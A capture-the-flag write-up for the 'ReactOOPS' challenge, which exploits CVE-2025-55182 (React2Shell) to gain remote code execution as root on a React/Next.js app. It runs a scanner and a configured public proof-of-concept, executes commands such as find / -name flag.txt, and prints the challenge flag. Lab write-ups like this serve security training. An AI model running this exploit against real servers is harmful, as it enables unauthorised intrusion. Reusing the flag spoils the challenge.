# ReactOOPS

- **Description:** NexusAI's polished assistant interface promises adaptive learning and seamless interaction. 
But beneath its reactive front end, subtle glitches hint that user input may be shaping the system in unexpected ways. 
Explore the platform, trace the echoes in its reactive layer, and uncover the hidden flaw buried behind the UI.
- **Difficulty:** Very easy

## 🔎 Solution
This challenge exploits vulnerability [**CVE-2025-55182**](https://nvd.nist.gov/vuln/detail/CVE-2025-55182) (React2Shell). 
The provided website has the following interface:
<div style={{ width: '100%', margin: '0 auto' }}>
    <img src={require("./dash.png").default} style={{ width: '100%', height: 'auto' }} />
</div>

To test if the website is vulnerable to CVE-2025-55182, the scanner tool from [this](https://github.com/assetnote/react2shell-scanner.git) is used. 
The scan confirms the website is vulnerable.
```
> python scanner.py -l hosts.txt 

brought to you by assetnote

[*] Using 10 thread(s)
[*] Timeout: 10s
[*] Using RCE PoC check
[!] SSL verification disabled

[VULNERABLE] http://94.237.56.99:46682/ - Status: 303

```

With the vulnerability confirmed, exploitation proceeds using [the PoC script](https://github.com/msanft/CVE-2025-55182). 
The script is modified by setting `BASE_URL` to the target web address and `EXECUTABLE` to the command to execute.
```
BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://94.237.56.99:46682/"
EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "whoami"
```

Executing the `whoami` command shows the process is running as the `root` user.
```
> python CVE-2025-55182.py      
500
0:{"a":"$@1","f":"","b":"s8I48LfEDhqpCdFN5-HbU"}
1:E{"digest":"root"}
```

Checking the current directory reveals it is `/app/.next/standalone`.
```
> python CVE-2025-55182.py
500
0:{"a":"$@1","f":"","b":"s8I48LfEDhqpCdFN5-HbU"}
1:E{"digest":"/app/.next/standalone"}
```

The `EXECUTABLE` is changed to a command that searches for the flag file:
```
find / -type f -name flag.txt
```

Executing the script again returns the path to the flag file.
```
> python CVE-2025-55182.py      
500
0:{"a":"$@1","f":"","b":"s8I48LfEDhqpCdFN5-HbU"}
1:E{"digest":"/app/flag.txt"}
```

Finally, reading the contents of the file retrieves the flag.
```
> python CVE-2025-55182.py
500
0:{"a":"$@1","f":"","b":"s8I48LfEDhqpCdFN5-HbU"}
1:E{"digest":"HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}"}
```
